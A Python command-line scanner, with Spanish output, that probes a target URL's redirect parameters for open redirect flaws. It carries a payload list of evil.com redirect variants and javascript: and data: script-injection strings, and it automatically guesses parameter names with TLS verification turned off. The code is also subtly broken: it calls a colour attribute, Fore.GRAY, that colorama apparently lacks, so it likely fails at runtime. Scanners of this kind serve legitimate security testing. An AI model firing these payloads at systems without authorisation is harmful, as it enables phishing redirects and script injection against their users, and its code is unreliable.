#!/usr/bin/env python3
"""13 · OPEN REDIRECT TESTER — Test for open redirect vulnerabilities"""

import requests, argparse, json, urllib.parse, sys
from colorama import Fore, Style, init
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

BANNER = f"{Fore.YELLOW}╔══════════════════════════════════════╗\n║  🔀 OPEN REDIRECT TESTER  v1.0       ║\n║  Detect unvalidated redirect flaws   ║\n╚══════════════════════════════════════╝{Style.RESET_ALL}"

REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "///evil.com",
    "https://evil.com%2F", "https://evil.com%09",
    "https:///evil.com", "https://evil.com%23",
    "/%2F%2Fevil.com", "/\\evil.com", "https://evil.com/.",
    "https://target.com@evil.com", "https://evil%2ecom",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
]

REDIRECT_PARAMS = ["url","redirect","redirect_url","redirect_uri","return","return_url",
                   "next","goto","target","redir","r","u","link","location","back","forward"]

def test_redirect(base_url: str, param: str, payload: str,
                  session: requests.Session, timeout: float) -> dict | None:
    test_url = f"{base_url}?{param}={urllib.parse.quote(payload, safe='')}"
    try:
        r = session.get(test_url, timeout=timeout, allow_redirects=False,
                        verify=False, headers={"User-Agent":"Mozilla/5.0"})
        if r.status_code in (301,302,303,307,308):
            location = r.headers.get("Location","")
            if "evil.com" in location or "javascript:" in location or "data:" in location:
                return {
                    "url": test_url, "param": param, "payload": payload,
                    "status": r.status_code, "location": location,
                    "level": "CRÍTICO" if "evil.com" in location else "ALTO",
                }
    except: pass
    return None

def discover_redirect_params(url: str, session: requests.Session) -> list:
    """Try known redirect param names on the target URL."""
    found = []
    for param in REDIRECT_PARAMS:
        test = f"{url}?{param}=https://evil.com"
        try:
            r = session.get(test, timeout=5, allow_redirects=False, verify=False)
            if r.status_code in (301,302,303,307,308):
                loc = r.headers.get("Location","")
                if "evil.com" in loc:
                    found.append(param)
        except: pass
    return found

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Open Redirect Tester")
    parser.add_argument("-u","--url",     required=True, help="URL objetivo")
    parser.add_argument("-p","--param",   default=None,  help="Parámetro específico")
    parser.add_argument("--discover",     action="store_true", help="Descubrir params automáticamente")
    parser.add_argument("--timeout",      type=float, default=5.0)
    parser.add_argument("-o","--output",  default=None)
    args = parser.parse_args()

    url = args.url if args.url.startswith("http") else "http://" + args.url
    session = requests.Session()
    vulnerabilities = []

    params_to_test = [args.param] if args.param else REDIRECT_PARAMS
    if args.discover:
        print(f"{Fore.CYAN}[*] Descubriendo parámetros de redirección...")
        found_params = discover_redirect_params(url, session)
        if found_params:
            params_to_test = found_params
            print(f"  {Fore.GREEN}Params encontrados: {found_params}\n")

    total = len(params_to_test) * len(REDIRECT_PAYLOADS)
    print(f"{Fore.CYAN}[*] URL      : {url}")
    print(f"{Fore.CYAN}[*] Parámetros: {len(params_to_test)}")
    print(f"{Fore.CYAN}[*] Payloads : {len(REDIRECT_PAYLOADS)}")
    print(f"{Fore.CYAN}[*] Total    : {total} tests\n")

    done = 0
    for param in params_to_test:
        for payload in REDIRECT_PAYLOADS:
            done += 1
            sys.stdout.write(f"\r  {Fore.GRAY}[{done}/{total}] {param} → {payload[:30]}{Style.RESET_ALL}   ")
            sys.stdout.flush()
            r = test_redirect(url, param, payload, session, args.timeout)
            if r:
                vulnerabilities.append(r)
                print(f"\n\n  {Fore.RED}[VULNERABLE]{Style.RESET_ALL}")
                print(f"    Param   : {param}")
                print(f"    Payload : {payload}")
                print(f"    Location: {r['location']}\n")

    print(f"\n\n{Fore.GRAY}{'─'*44}")
    if vulnerabilities:
        print(f"{Fore.RED}[!] Vulnerabilidades encontradas: {len(vulnerabilities)}")
    else:
        print(f"{Fore.GREEN}[✓] Sin Open Redirects detectados con los payloads probados")

    if args.output and vulnerabilities:
        with open(args.output,"w") as f: json.dump(vulnerabilities, f, indent=2)
        print(f"{Fore.CYAN}[*] Guardado: {args.output}")

if __name__ == "__main__":
    main()
